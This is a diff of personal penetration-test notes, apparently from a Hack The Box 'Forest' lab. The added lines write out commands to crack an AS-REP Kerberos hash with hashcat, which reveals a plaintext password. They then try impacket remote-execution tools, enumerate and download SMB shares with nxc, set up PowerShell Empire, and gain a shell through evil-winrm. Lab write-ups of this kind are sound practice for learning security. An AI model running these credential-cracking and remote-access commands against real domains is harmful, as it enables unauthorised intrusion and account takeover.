@@ -19,5 +19,60 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:f1d92e8069100d3211632fa206366492$8fce52fb99
 ```
 - Cracking svc-alfresco with mimikatz
 ```
-
+hashcat -m 18200 hashes.domain.txt /usr/share/wordlists/rockyou.txt --force
 ```
+- Cracked::: s3rvice
+- trying psexec
+```
+impacket-psexec htb.local/svc-alfresco:s3rvice@htb.local
+```
+- showed shares none writable so it didn't work
+- trying smbexec
+```
+impacket-smbexec htb.local/svc-alfresco:s3rvice@htb.local
+```
+- didn't work. Denied
+- Trying wmiexec
+```
+impacket-wmiexec htb.local/svc-alfresco:s3rvice@htb.local
+```
+- Access denied. Moving on to enumerate smb
+```
+nxc smb -d htb.local -u svc-alfresco -p s3rvice --shares htb.local
+```
+- Found SYSVOL and NETLOGON are readable
+- have command execution by adding -x whoami at the end of the nxc command. Going to try to get a shell with powershell-empire
+```
+sudo powershell-empire server
+```
+```
+sudo powershell-empire client
+```
+- Get the empire.db file path from /usr/share/powershell-empire/empire/server/config.yaml
+```
+location: /var/lib/powershell-empire/server/data/empire.db
+```
+- Default login
+```
+username: empireadmin
+password: password123
+```
+- generate the listener on http with an appropriate name
+- false alarm we do not have execution through nxc smb -x
+- enumerate shares with 
+```
+nxc smb 10.10.10.161 -d htb.local -u svc-alfresco -p s3rvice -M spider_plus
+```
+- View shares in /tmp/nxc_hosted/nxc_spider_plus
+- Get the files with
+```
+nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
+```
+- nothing valuable in the smb shares
+- Need to try evil-winrm 
+```
+evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
+```
+- got a shell
+- got user
+- 
